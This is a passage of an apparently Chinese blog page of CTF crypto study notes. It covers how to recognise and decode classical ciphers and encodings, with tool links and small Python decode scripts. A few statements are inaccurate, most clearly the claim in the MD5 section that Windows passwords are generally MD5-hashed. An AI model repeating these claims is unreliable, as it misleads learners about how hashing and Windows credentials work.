href="http://codertab.com/JsUnFuck">http://codertab.com/JsUnFuck</a></li><li>用6 个字符 <strong>( ) [ ] !+</strong> 来对JavaScript进行编码</li></ol><h1 id="Brainfuck："><a href="#Brainfuck：" class="headerlink" title="Brainfuck："></a>Brainfuck：</h1><ol><li><a href="https://copy.sh/brainfuck/text.html">https://copy.sh/brainfuck/text.html</a></li><li>仅由 <strong>&lt;&gt;+-.[]</strong> 组成，大量的 <strong>+-</strong> 符号。</li></ol><h1 id="凯撒密码（caesar，凯撒密码在历史上最初的偏移量是3）："><a href="#凯撒密码（caesar，凯撒密码在历史上最初的偏移量是3）：" class="headerlink" title="凯撒密码（caesar，凯撒密码在历史上最初的偏移量是3）："></a>凯撒密码（caesar，凯撒密码在历史上最初的偏移量是3）：</h1><ol><li><a href="https://ctf.bugku.com/tool/caesar">https://ctf.bugku.com/tool/caesar</a></li><li>一般正常的凯撒密码只会在26个字母里替换，所以如果密文中由{}可能是凯撒</li><li>出题时，偏移量可能是不变的；也可能时随着字母向后推移，偏移量递增或递减等。</li><li>有些时候，出题人没告诉凯撒密码的偏移量，而解密后还有其他加密的时候可以首先用偏移量为3的解密结果去试其他加密。如：[WUSTCTF2020]佛说：只能四天</li><li>根据偏移量不同还存在    若干特定的凯撒密码名称：<ol><li>偏移量为10：Avocat</li><li>偏移量为13：ROT13</li><li>偏移量为-5：Cassis（K6）</li><li>偏移量为-6：Cassette(K7)</li></ol></li></ol><h1 id="ROT密码-凯撒密码的变式"><a href="#ROT密码-凯撒密码的变式" class="headerlink" title="ROT密码(凯撒密码的变式):"></a>ROT密码(凯撒密码的变式):</h1><ol><li><a href="https://www.qqxiuzi.cn/bianma/rot5-13-18-47.php">https://www.qqxiuzi.cn/bianma/rot5-13-18-47.php</a></li><li>ROT5：<ol><li><a href="https://www.jisuan.mobi/p3Bu6zmuzmzNuyXQ.html">https://www.jisuan.mobi/p3Bu6zmuzmzNuyXQ.html</a></li><li>只对数字进行编码，用当前数字往前数的第5个数字替换当前数字，例如当前为0，编码后变成5，当前为1，编码后变成6，以此类推顺序循环。</li><li>只有数字构成</li></ol></li><li>ROT13(只说rot，很可能默认是rot13)：<ol><li><a href="https://www.jisuan.mobi/puzzm6z1B1HH6yXW.html">https://www.jisuan.mobi/puzzm6z1B1HH6yXW.html</a></li><li>只对字母进行编码，用当前字母往前数的第13个字母替换当前字母，例如当前为A，编码后变成N，当前为B，编码后变成O，以此类推顺序循环</li><li>只有字母构成</li></ol></li><li>ROT18：<ol><li><a href="https://www.jisuan.mobi/pbH1zHNNNHHuHyXS.html">https://www.jisuan.mobi/pbH1zHNNNHHuHyXS.html</a></li><li>这是一个异类，本来没有，它是将ROT5和ROT13组合在一起，为了好称呼，将其命名为ROT18。</li><li>由数字和字母构成</li></ol></li><li>ROT47：<ol><li><a href="https://www.jisuan.mobi/puu3uummu313myXP.html">https://www.jisuan.mobi/puu3uummu313myXP.html</a></li><li>对数字、字母、常用符号进行编码，按照它们的ASCII值进行位置替换，用当前字符ASCII值往前数的第47位对应字符替换当前字符，例如当前为小写字母z，编码后变成大写字母K，当前为数字0，编码后变成符号_。用于ROT47编码的字符其ASCII33－126，具体可参考ASCII编码。</li><li>有各种字符构成，当什么奇怪的字符都有的时候，可以考虑。</li></ol></li></ol><h1 id="维吉尼亚密码（vigenere）："><a href="#维吉尼亚密码（vigenere）：" class="headerlink" title="维吉尼亚密码（vigenere）："></a>维吉尼亚密码（vigenere）：</h1><ol><li><p><a href="http://www.hiencode.com/vigenere.html">http://www.hiencode.com/vigenere.html</a>（解密网站，需要密钥）</p></li><li><p><a href="https://www.guballa.de/vigenere-solver">https://www.guballa.de/vigenere-solver</a>（解密网站，不需要密钥，一般密文较长）</p></li><li><p><a href="https://zhuanlan.zhihu.com/p/552942664">https://zhuanlan.zhihu.com/p/552942664</a>，<a href="https://www.jianshu.com/p/2b69dde012e3">https://www.jianshu.com/p/2b69dde012e3</a>（维吉尼亚密码解析）</p></li><li><p>维吉尼亚密码原理：                                                                                          <img src="/2025/03/01/%E5%AF%86%E7%A0%81%E7%AC%94%E8%AE%B0/../../../1-笔记/图片/密码1.assets/image-20240714114114303.png" alt="image-20240714114114303" style="zoom: 50%;"><img src="/2025/03/01/%E5%AF%86%E7%A0%81%E7%AC%94%E8%AE%B0/../图片/密码笔记.assets/image-20240714114024197.png" alt="image-20240714114024197" style="zoom:50%;"></p></li><li><p>解密思路：因此在破译维吉尼亚密码时候重要的是要知道秘钥的长度，因为只要确定了秘钥长度，对维吉尼亚密码进行分解，分解后得到的便是多组凯撒密码。</p><ol><li>以下例子来自limisky博客：如密文为：ABCDEFGHIJKLMN</li><li>如果我们知道密钥长度为3，就可将其分解为三组：组1：A D G J N；组2：B E H K；组3：C F I M分解后每组就是一个凯撒密码，即组内的位移量是一致的，对每一组即可用频度分析法来解密。所以破解维吉尼亚密码的关键就是确定密钥的长度。</li></ol></li></ol><h1 id="经典单表替换密码："><a href="#经典单表替换密码：" class="headerlink" title="经典单表替换密码："></a>经典单表替换密码：</h1><ol><li><a href="https://quipqiup.com/">https://quipqiup.com/</a><ol><li>在使用这个网页时，他会自动将非字母的字符省略</li><li>解密出来的明文会自动的加上空格，所以需要将空格去掉</li></ol></li><li>由26个字母组成</li><li>无规律的替换</li></ol><h1 id="atbash（阿特巴希密码）："><a href="#atbash（阿特巴希密码）：" class="headerlink" title="atbash（阿特巴希密码）："></a>atbash（阿特巴希密码）：</h1><ol><li><a href="http://www.metools.info/code/atbash209.html">http://www.metools.info/code/atbash209.html</a></li><li>简单的替换密码（特殊的仿射密码）</li><li>替换原则：它将字母表中的每个字母都替换成相反顺序的字母，即’A’与’Z’替换，’B’与’Y’替换，以此类推。</li><li>阿特巴希密码其实可以看作一种特殊的仿射密码。如果你定义首个字母为0，第二个字母为1等字母直到字母表的最后一个字母为字母数-1，然后阿特巴希密码将可使用仿射密码来加密与解密：f(x) &#x3D; (ax + b) mod m 。阿特巴希密码的算式为：a &#x3D; b &#x3D; m - 1，其中m是字母表中的字母数（m &#x3D; 26)。</li></ol><h1 id="云影密码（又称01248密码）："><a href="#云影密码（又称01248密码）：" class="headerlink" title="云影密码（又称01248密码）："></a>云影密码（又称01248密码）：</h1><ol><li>0用于分割，其他数字用于做加和操作之后转明文，加和的数字即为字符下标。</li><li>云影密码：若密文中只有数字，且仅包含01248，则很可能是云影密码。</li><li>解密脚本：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">a=&#x27;8842101220480224404014224202480122&#x27;.split(&#x27;0&#x27;)</span><br><span class="line">flag=&quot;&quot;</span><br><span class="line">for i in a:</span><br><span class="line">    tmp=0</span><br><span class="line">    for j in i:</span><br><span class="line">        tmp+=int(j)</span><br><span class="line">    flag+=chr(tmp+64)</span><br><span class="line">print(flag)</span><br><span class="line">————————</span><br><span class="line">flag是：WELLDONE</span><br></pre></td></tr></table></figure><h1 id="栅栏密码（fence）："><a href="#栅栏密码（fence）：" class="headerlink" title="栅栏密码（fence）："></a>栅栏密码（fence）：</h1><ol><li><a href="https://ctf.bugku.com/tool/railfence">https://ctf.bugku.com/tool/railfence</a>和python脚本</li><li>介绍+解密：<a href="https://blog.csdn.net/qq_26131031/article/details/123735156">https://blog.csdn.net/qq_26131031&#x2F;article&#x2F;details&#x2F;123735156</a></li><li>加密：把明文分为n个一组，然后把每组的第一个字符连起来，形成一段无规律的字符。</li><li>特征：密钥是数字，密文不会太长，一般不超过30个。</li><li>密文中直接包含明文中的所有字符，只是顺序打乱，所以如果包含flag{}格式中的{}，和f、l、a、g字符，则考虑栅栏密码解密。</li><li>栅栏密码还可以以加密的形式来作为解密求出明文。eg：buuctf中篱笆墙的影子一题，就是将给出的密文进行栅栏密码加密可以得到最终的flag</li><li>w型栅栏密码：<ol><li><a href="https://blog.csdn.net/YUK_103/article/details/98163062">https://blog.csdn.net/YUK_103&#x2F;article&#x2F;details&#x2F;98163062</a>   </li><li>解密网站：[<a href="http://www.atoolbox.net/Tool.php?Id=777%5D">http://www.atoolbox.net/Tool.php?Id=777]</a>(<a href="http://www.atoolbox.net/Tool.php?Id=777">http://www.atoolbox.net/Tool.php?Id=777</a></li></ol></li></ol><h1 id="培根密码："><a href="#培根密码：" class="headerlink" title="培根密码："></a>培根密码：</h1><ol><li><a href="http://www.hiencode.com/baconian.html">http://www.hiencode.com/baconian.html</a></li><li>密文仅有a、b两种字符（或仅有两种字符，不一定是a、b），则考虑培根密码。</li></ol><h1 id="url编码："><a href="#url编码：" class="headerlink" title="url编码："></a>url编码：</h1><ol><li><a href="http://www.mxcz.net/tools/Url.aspx">http://www.mxcz.net/tools/Url.aspx</a></li><li>url&#x3D;%+hex（hex的密文两个两个的取）</li><li>有许多“<strong>%</strong>”</li><li>每个“<strong>%</strong>”后面有两个字符，字母或者数字</li><li>解密url编码时，一般用encodeURIComponent函数</li><li>url编码是基于unicode&#x2F;GBK等编码的一种编码方式</li><li>url编码的转码结果基本是和hex编码的结果相同，不同的是当你用url编码网址时是不会把http、https关键字和&#x2F;、？、&amp;、&#x3D;等连接符进行编码的，而hex编码则全部转化。</li></ol><h1 id="MD5密码是一种被广泛使用的密码散列函数，可以产生一个128位的散列值。其特点为："><a href="#MD5密码是一种被广泛使用的密码散列函数，可以产生一个128位的散列值。其特点为：" class="headerlink" title="MD5密码是一种被广泛使用的密码散列函数，可以产生一个128位的散列值。其特点为："></a>MD5密码是一种被广泛使用的密码散列函数，可以产生一个128位的散列值。其特点为：</h1><ol><li><a href="https://www.somd5.com/">https://www.somd5.com/</a></li><li><a href="https://www.cmd5.com/">https://www.cmd5m/</a>（可能要付费）</li><li>MD5是hash算法的一种</li><li>长度固定，总是16个字节，32位的字符串 </li><li>一般为16位或32位大小写字母数字混合字符串</li><li>解密可能出现33位字符串，应判断多余字符，将其去掉</li><li>也可能给你很长的一个字符串让你判断，选出其中正确的字符串。例如buuctf中windows系统密码一题：<ol><li>仔细看冒号给出的规律，我们可以发现由5个字符串，其中每个字符串的长度均为32，又是hash算法，因此我们可以判断很可能是MD5</li><li>我们在一次用这五个字符串去尝试，就可找出正解</li></ol></li><li>表现形式很可能是：<strong>Administrator:500: <strong>xxxxxx（一串32位或16位字符串）</strong>: <strong>xxxxxx（一串32位或16位字 符串）</strong>:::</strong>（可能不是‘administrator’‘500’而是其他字符串和数字，但格式是如此）</li><li>windows密码一般是MD5加密</li><li>python加密</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line"></span><br><span class="line">text = &quot;Hello, world!&quot;</span><br><span class="line">encrypted_text = hashlib.md5(text.encode(&#x27;utf-8&#x27;)).hexdigest()</span><br><span class="line">print(encrypted_text)</span><br></pre></td></tr></table></figure><h1 id="莫尔斯电码（摩尔斯、Morse或摩斯电码）："><a href="#莫尔斯电码（摩尔斯、Morse或摩斯电码）：" class="headerlink" title="莫尔斯电码（摩尔斯、Morse或摩斯电码）："></a>莫尔斯电码（摩尔斯、Morse或摩斯电码）：</h1><ol><li><a href="http://www.zhongguosou.com/zonghe/moErSiCodeConverter.aspx">http://www.zhongguosou.com/zonghe/moErSiCodeConverter.aspx</a>和python脚本</li><li>由 “<strong>.”</strong>、”<strong>-</strong>“组成，可能会有”<strong>&#x2F;</strong>“（它的变式同样可能用其他字符替代 . 和 - ）</li><li>会用空格或斜杠来分割密文</li><li>编码不区分大小写</li><li>做题时，可能会出现摩尔斯电码和其他编码混合出现的情况：摩尔斯编码+hex编码（buuctf中的[AFCTF2018]Morsee一题）</li></ol><h1 id="quoted-printable编码："><a href="#quoted-printable编码：" class="headerlink" title="quoted-printable编码："></a>quoted-printable编码：</h1><ol><li><a href="http://www.mxcz.net/tools/QuotedPrintable.aspx/">http://www.mxcz.net/tools/QuotedPrintable.aspx/</a></li><li>任何一个8位的字节值可编码为3个字符：一个等号”&#x3D;”后跟随两个十六进制数字(0–9或A–F)表示该字节的数值，和url很类似</li><li>quoted-printable编码的数据的每行长度不能超过76个字符. 为满足此要求又不改变被编码文本，在QP编码结果的每行末尾加上软换行(soft line break). 即在每行末尾加上一个”&#x3D;”, 但并不会出现在解码得到的文本中</li><li>quoted-printable编码中会出现许多‘<strong>&#x3D;</strong>’</li></ol><h1 id="rabbit高速流密码："><a href="#rabbit高速流密码：" class="headerlink" title="rabbit高速流密码："></a>rabbit高速流密码：</h1><ol><li>以U2FsdGVkX1开头</li><li>可能以‘<strong>&#x3D;</strong>’结尾</li><li>组成：26个大小写英文字母、&#x3D;、&#x2F;、+</li></ol><h1 id="AES密码："><a href="#AES密码：" class="headerlink" title="AES密码："></a>AES密码：</h1><ol><li><a href="http://www.hiencode.com/caes.html">http://www.hiencode.com/caes.html</a></li></ol><h1 id="SHA系列："><a href="#SHA系列：" class="headerlink" title="SHA系列："></a>SHA系列：</h1><ol><li><a href="https://www.cmd5.com/">https://www.cmd5.com/</a></li><li>SHA-1：字母（a-f）和数字（0-9）混合，固定位数 40 位</li><li>SHA-224&#x2F;SHA3-224：字母（a-f）和数字（0-9）混合，固定位数 56 位</li><li>SHA-256&#x2F;SHA3-256：字母（a-f）和数字（0-9）混合，固定位数 64 位</li><li>SHA-384&#x2F;SHA3-384：字母（a-f）和数字（0-9）混合，固定位数 96 位</li><li>SHA-512&#x2F;SHA3-512：字母（a-f）和数字（0-9）混合，固定位数 128 位</li></ol><h1 id="中文电码："><a href="#中文电码：" class="headerlink" title="中文电码："></a>中文电码：</h1><ol><li><a href="http://code.mcdvisa.com/">http://code.mcdvisa.com/</a></li><li>密文以四位（0-9）为一组的数字表示，一组数字对应一个中文，所以其密文长度一定是4的倍数。</li></ol><h1 id="猪圈密码："><a href="#猪圈密码：" class="headerlink" title="猪圈密码："></a>猪圈密码：</h1><ol><li><a href="http://www.hiencode.com/pigpen.html">http://www.hiencode.com/pigpen.html</a></li><li>由一些奇怪的符号构成：                                                                                    <img src="/../%E5%9B%BE%E7%89%87/%E5%AF%86%E7%A0%81%E7%AC%94%E8%AE%B0.assets/image-20240714152004374-1721657379341-12.png" alt="image-20240714152004374">或<img src="/2025/03/01/%E5%AF%86%E7%A0%81%E7%AC%94%E8%AE%B0/../../../1-笔记/图片/密码1.assets/image-20240714152026962.png" alt="image-20240714152026962" style="zoom:80%;"></li></ol><h1 id="古埃及象形文字："><a href="#古埃及象形文字：" class="headerlink" title="古埃及象形文字："></a>古埃及象形文字：</h1><ol><li><pre><code>                                                                                        ![image-20240714152109388](../图片/密码笔记.assets/image-20240714152109388-1721657392451-14.png)</code></pre></li></ol><h1 id="圣堂武士密码："><a href="#圣堂武士密码：" class="headerlink" title="圣堂武士密码："></a>圣堂武士密码：</h1><ol><li>有奇怪的图案构成：</li></ol><p><img src="/../%E5%9B%BE%E7%89%87/%E5%AF%86%E7%A0%81%E7%AC%94%E8%AE%B0.assets/image-20240714152130152-1721657425680-16.png" alt="image-20240714152130152"></p><h1 id="标准银河密码："><a href="#标准银河密码：" class="headerlink" title="标准银河密码："></a>标准银河密码：</h1><ol><li>由一些奇怪的图案构成：<img src="/2025/03/01/%E5%AF%86%E7%A0%81%E7%AC%94%E8%AE%B0/../图片/密码笔记.assets/image-20240714152215682.png" alt="image-20240714152215682" style="zoom: 67%;"></li></ol><h1 id="仿射密码："><a href="#仿射密码：" class="headerlink" title="仿射密码："></a>仿射密码：</h1><ol><li>为便于计算，将26个英文字母用数字表示：a&#x3D;0,b&#x3D;1,…,z&#x3D;25</li><li>仿射加密的密钥有两个：a和b，取值范围都是[0,25]。</li><li>a要求与26互质</li><li>x是明文，y是密文加密公式：y&#x3D;(a<em>x+b)%26（0&#x3D;&lt;x,y&lt;&#x3D;25）解密：y≡(a*x+b)(mod26) &#x3D;&gt; (y-b)≡(a</em>x)(mod26) &#x3D;&gt;(y-b)*a^(-1)≡x(mod26) &#x3D;&gt; x &#x3D; [(y-b)*a^(-1)]%26</li></ol><h1 id="曼切斯特编码："><a href="#曼切斯特编码：" class="headerlink" title="曼切斯特编码："></a>曼切斯特编码：</h1><ol><li>每个周期都一定会跳变</li><li>标准曼彻斯特<ol><li>G. E. Thomas, Andrew S. Tanenbaum1949年提出的，它规定0是由低-高的电平跳变表示，1是高-低的电平跳变</li><li>编码0101（即0x5），表示原数据为00</li><li>编码1001（0x9）表示10</li><li>编码0110（0x6）表示01</li><li>编码1010（0xA）表示11</li><li>括号内是16进制的表示，原编码是2进制的表示</li></ol></li><li>802.3曼彻斯特<ol><li>IEEE 802.4（令牌总线）和低速版的IEEE 802.3（以太网）中规定, 按照这样的说法, 低-高电平跳变表示1, 高-低的电平跳变表示0。</li><li>编码0101（0x5）表示11；</li><li>编码1001（0x9）表示01；</li><li>编码0110（0x6）表示10；</li><li>编码1010（0xA）表示00；</li><li>括号内是16进制的表示，原编码是2进制的表示</li></ol></li><li>差分曼彻斯特<ol><li>相较于其他曼彻斯特编码而言，密文开头多了3E作为区别</li><li>在最初信号的时候，即第一个信号时：如果中间位电平从低到高，则表示0；如果中间位电平从高到低，则表示1。</li><li>后面的信号（从第二个开始）就看每个信号位开始时有没有跳变来决定：在信号  位开始时改变信号极性，表示逻辑”0”；在信号位开始时不改变信号极性，表示 辑”1”。</li></ol></li><li>一般来说曼彻斯特有5、6、9、A构成，也可能使有0、1构成。</li><li>一般题名叫传感器的题很可能是曼彻斯特编码，题目中给的ID是一部分flag</li></ol><h1 id="Unicode编码："><a href="#Unicode编码：" class="headerlink" title="Unicode编码："></a>Unicode编码：</h1><ol><li><a href="https://ctf.bugku.com/tool/uuencode">https://ctf.bugku.com/tool/uuencode</a></li><li>一般以\u、&amp;#或&amp;#x开头，后面是数字加字母组合<ol><li>\u和&amp;#x开头是一样的，都是16进制unicode字符的不同写法</li><li>&amp;#开头则是unicode字符10进制的写法</li><li>&amp;#、&amp;#x开头的也被称为HTML字符实体转换</li></ol></li><li>用一个字节以上表示的字符，假设是N个字节表示这个字符：则该字符第一个字节的前N位都为1，第N+1位为0，剩下的N-1个字节的前两位都设为10，剩下没有主动设值的位置则使用这个字符的Unicode二进制代码点从低位到高位填充，不够用0补足。</li><li>首先“罗”对应了unicode中的U+7F57，对应编码表中第三行，也就是用3个字节来表示的字符，把7F57的二进制111 1111 0101 0111‬从低位对应补足到1110xxxx 10xxxxxx 10xxxxxx(从低位)，最后成为11100111 10111101 10010111即十六进制E7BD97。</li><li>编码对照表如下：</li></ol><table><thead><tr><th><br>1.  Unicode字符集范围（十六进制）</th><th>UTF-8编码（二进制）</th></tr></thead><tbody><tr><td>0000 0000 - 0000 007F</td><td>0xxxxxxx</td></tr><tr><td>0000 0080 - 0000 07FF</td><td>110xxxxx 10xxxxxx</td></tr><tr><td>0000 0800 - 0000 FFFF</td><td>1110xxxx 10xxxxxx 10xxxxxx</td></tr><tr><td>0001 0000 - 0010 FFFF</td><td>11110xxx 10xxxxxx 10xxxxxx 10xxxxxx</td></tr></tbody></table><h1 id="UUencode编码："><a href="#UUencode编码：" class="headerlink" title="UUencode编码："></a>UUencode编码：</h1><ol><li>Uuencode将输入资料以每三个字节为单位进行编码，如此重复进行。如果最后剩下的资料少于三个字节，不够的部份用零补齐。这三个字节共有24个Bit，以6-bit为单位分为4个群组，每个群组以十进制来表示所出现的数值只会落在0到63之间。将每个数加上32，所产生的结果刚好落在ASCII字符集中可打印字符（32-空白…95-底线）的范围之中。</li><li>每60个编码输出（相当于45个输入字节）将输出为独立的一行，每行的开头会加上<strong>长度字符</strong>，除了最后一行之外，<strong>长度字符都应该是’M’这个ASCII字符</strong>（77&#x3D;32+<strong>45</strong>），最后一行的长度字符为<strong>32+剩下的字节数目</strong>这个ASCII字符。</li><li>密文特征，每行开头应该为<strong>M</strong></li><li>编码原理类似与于base64</li></ol><h1 id="aaencode编码："><a href="#aaencode编码：" class="headerlink" title="aaencode编码："></a>aaencode编码：</h1><ol><li><a href="https://utf-8.jp/public/aaencode.html">https://utf-8.jp/public/aaencode.html</a></li><li>是js加密，可以把文字加密成表情。</li><li>仅由日式表情符号组成</li></ol><h1 id="jjencode："><a href="#jjencode：" class="headerlink" title="jjencode："></a>jjencode：</h1><ol><li><a href="http://www.hiencode.com/jjencode.html">http://www.hiencode.com/jjencode.html</a></li><li>大量** $<strong>、</strong>_ **符号、大量重复的自定义变量；</li><li>仅由 18 个符号组成：<strong><a href></a>!+,&quot;$.:;_{}~&#x3D;</strong></li></ol><h1 id="当铺密码："><a href="#当铺密码：" class="headerlink" title="当铺密码："></a>当铺密码：</h1><ol><li>根据汉字有多少笔画出头，对应的明文就是数字几</li></ol><h1 id="与佛论禅："><a href="#与佛论禅：" class="headerlink" title="与佛论禅："></a>与佛论禅：</h1><ol><li><a href="https://ctf.bugku.com/tool/todousharp">https://ctf.bugku.com/tool/todousharp</a>（多的空格和换行会影响解密，导致解密失败）</li><li>开头是佛曰</li></ol><h1 id="新约佛论禅："><a href="#新约佛论禅：" class="headerlink" title="新约佛论禅："></a>新约佛论禅：</h1><ol><li><a href="http://hi.pcmoe.net/buddha.html">http://hi.pcmoe.net/buddha.html</a></li><li>开头是新佛曰</li></ol><h1 id="跳舞小人："><a href="#跳舞小人：" class="headerlink" title="跳舞小人："></a>跳舞小人：</h1><ol><li>一串跳舞小人图案组成的密文：<img src="/2025/03/01/%E5%AF%86%E7%A0%81%E7%AC%94%E8%AE%B0/../图片/密码笔记.assets/image-20240714152514759.png" alt="image-20240714152514759" style="zoom:80%;"></li></ol><h1 id="四方密码："><a href="#四方密码：" class="headerlink" title="四方密码："></a>四方密码：</h1><ol><li><a href="http://www.online.crypto-it.net/eng/four-square.html">http://www.online.crypto-it.net/eng/four-square.html</a></li><li>四方密码用4个5×5的矩阵来加密。每个矩阵都有25个字母（通常会取消Q或将I,J视作同一样，或改进为6×6的矩阵，加入10个数字）。</li><li>加密步骤：<ol><li><p>把字符串按两个字母一组分开</p></li><li><p>找第一组第一个字母在左上角矩阵的位置</p></li><li><p>找第一组第二个字母在右下角矩阵的位置</p></li><li><p>先找和一个字母同行的，和第二个字母同列的：                                         <img src="/../%E5%9B%BE%E7%89%87/%E5%AF%86%E7%A0%81%E7%AC%94%E8%AE%B0.assets/image-20240714152612948-1721657483968-18.png" alt="image-20240714152612948"></p></li><li><p>第一个字母同列，第二个字母同行的：                                                                         <img src="/../%E5%9B%BE%E7%89%87/%E5%AF%86%E7%A0%81%E7%AC%94%E8%AE%B0.assets/image-20240714152647230-1721657486764-20.png" alt="image-20240714152647230"></p></li><li><p>得到he加密后为FY</p></li></ol></li><li>通常在题目中会给定2个密钥（通常是单词），一般我们将q或z删去，或者把I和J当成一个。秘钥中重复的字母去掉只留一个，然后再在单词后面按字母表顺序添加字母，密钥中出现过的字母不写，补充成5*5的矩阵。                                                                            （eg: information——&gt;informatbcdeghjklpsuvwxyz）</li></ol><h1 id="波利比奥斯密码（Polybius-Square-Cipher）："><a href="#波利比奥斯密码（Polybius-Square-Cipher）：" class="headerlink" title="波利比奥斯密码（Polybius Square Cipher）："></a>波利比奥斯密码（Polybius Square Cipher）：</h1><ol><li><p>解题脚本</p></li><li><p>波利比奥斯方阵密码（Polybius Square Cipher或称波利比奥斯棋盘）是棋盘密码的一种，是利用波利比奥斯方阵进行加密的密码方式。</p></li><li><p>简单的来说就是把字母排列好，用坐标(行列)的形式表现出来。字母是明文，密文便是字母的坐标(数字也可以用字母代替），即：<img src="/2025/03/01/%E5%AF%86%E7%A0%81%E7%AC%94%E8%AE%B0/../图片/密码笔记.assets/image-20240714152852140.png" alt="image-20240714152852140" style="zoom:67%;"><img src="/2025/03/01/%E5%AF%86%E7%A0%81%E7%AC%94%E8%AE%B0/../../../1-笔记/图片/密码1.assets/image-20240714152906737.png" alt="image-20240714152906737" style="zoom: 67%;"></p><p>​        表格里的26个字母的顺序不影响，因为在解密的时候会爆破枚举，所以更改顺序并不会影响最终结果。</p></li></ol><h1 id="希尔密码-Hill-Cipher-："><a href="#希尔密码-Hill-Cipher-：" class="headerlink" title="希尔密码(Hill Cipher)："></a>希尔密码(Hill Cipher)：</h1><ol><li><a href="http://www.metools.info/code/hillcipher243.html">http://www.metools.info/code/hillcipher243.html</a></li><li>提示词可能是山（hill）</li></ol><h1 id="普莱费尔（Playfair-Cipher）加密解密："><a href="#普莱费尔（Playfair-Cipher）加密解密：" class="headerlink" title="普莱费尔（Playfair Cipher）加密解密："></a>普莱费尔（Playfair Cipher）加密解密：</h1><ol><li><a href="http://www.metools.info/code/playfair_186.html">http://www.metools.info/code/playfair_186.html</a></li><li>可能会说公平的玩之类的提示密钥（加密普莱费尔加密，是密钥：playfair）</li></ol><h1 id="异或运算："><a href="#异或运算：" class="headerlink" title="异或运算："></a>异或运算：</h1><ol><li>a，b不同，异或结果为1；a，b相同，异或结果为0。python的异或运算符：^</li><li>一般是将两个数的值转化为二进制，再进行异或运算，最后得到的值就是异或运算的结果的二进制形式。      </li><li>异或运算的性质：a异或b&#x3D;c，则a异或c&#x3D;b；b异或c&#x3D;a</li><li>^异或时不会自动补全，低位异或，高位不变。如：</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">n1 = <span class="string">b&#x27;ab&#x27;</span></span><br><span class="line">n2 = <span class="string">b&#x27;a&#x27;</span></span><br><span class="line">c = bytes_to_long(n1) ^ bytes_to_long(n2)</span><br><span class="line"><span class="built_in">print</span>((long_to_bytes(c))[:<span class="number">1</span>])</span><br><span class="line"><span class="comment"># b&#x27;a&#x27;</span></span><br><span class="line"><span class="built_in">print</span>((long_to_bytes(c))[<span class="number">1</span>:])</span><br><span class="line"><span class="comment"># b&#x27;\x03&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(bytes_to_long(<span class="string">b&#x27;a&#x27;</span>) ^ bytes_to_long(<span class="string">b&#x27;b&#x27;</span>)))</span><br><span class="line"><span class="comment"># b&#x27;\x03&#x27;</span></span><br></pre></td></tr></table></figure><ol start="5"><li>在两个长度不同的字节串进行异或运算的时候，可以通过重复短的字节串自身来填充短的字节串，直到长度与长字节串一致。</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#len(a)&gt;len(key)</span></span><br><span class="line">complete_key = (key * (<span class="built_in">len</span>(a)//<span class="built_in">len</span>(key)+<span class="number">1</span>))[:<span class="built_in">len</span>(a)]</span><br><span class="line"><span class="comment">#[:len(a)],将长度限制在len(a)</span></span><br></pre></td></tr></table></figure><ol start="6"><li>xor函数能自动补全短字节的字节串，原理同 5 。</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> xor</span><br><span class="line"></span><br><span class="line">a = <span class="string">&#x27;0e0b213f26041e480b26217f27342e175d0e070a3c5b103e2526217f27342e175d0e077e263451150104&#x27;</span></span><br><span class="line">a = <span class="built_in">bytes</span>.fromhex(a)</span><br><span class="line">key = <span class="string">b&#x27;myXORkey&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(xor(a,key))</span><br></pre></td></tr></table></figure><h1 id="Brainfuck编码："><a href="#Brainfuck编码：" class="headerlink" title="Brainfuck编码："></a>Brainfuck编码：</h1><ol><li><a href="https://tool.bugku.com/brainfuck/?wafcloud=1">https://tool.bugku.com/brainfuck/?wafcloud=1</a></li><li>有’**&lt;‘ ’&gt;‘ ’+‘ ’-‘ ’.‘ ’，‘ ’[‘ ’]‘**八种符号来替换C语言的各种语法和命令</li></ol><h1 id="Ook密码："><a href="#Ook密码：" class="headerlink" title="Ook密码："></a>Ook密码：</h1><ol><li><a href="https://tool.bugku.com/brainfuck/?wafcloud=1">https://tool.bugku.com/brainfuck/?wafcloud=1</a></li><li>ook密码中有大量ook，加上一些符号</li></ol><h1 id="格雷编码："><a href="#格雷编码：" class="headerlink" title="格雷编码："></a>格雷编码：</h1><ol><li><a href="http://www.ab126.com/system/2780.html">http://www.ab126.com/system/2780.html</a></li><li>密文由0、1构成</li></ol><h1 id="字母表编码："><a href="#字母表编码：" class="headerlink" title="字母表编码："></a>字母表编码：</h1><ol><li><a href="http://ctf.ssleye.com/a1z26.html">http://ctf.ssleye.com/a1z26.html</a></li><li>用数字1-26或者0-25来编码范围为A-Z&#x2F;a-z字母字符，字母不区分大小写。</li></ol><h1 id="进制编码："><a href="#进制编码：" class="headerlink" title="进制编码："></a>进制编码：</h1><ol><li><a href="https://tool.oschina.net/hexconvert">https://tool.oschina.net/hexconvert</a></li><li>主要是各进制之间的转换</li><li>二进制数，只有01两个字符 </li><li>八进制数，0开头，用[0-7] 8个字符表示 </li><li>十六进制数，0x开头，[0-9，a-f ]等十六个个字符表示</li></ol><h1 id="GBK-GBK2312编码："><a href="#GBK-GBK2312编码：" class="headerlink" title="GBK&#x2F;GBK2312编码："></a>GBK&#x2F;GBK2312编码：</h1><ol><li><a 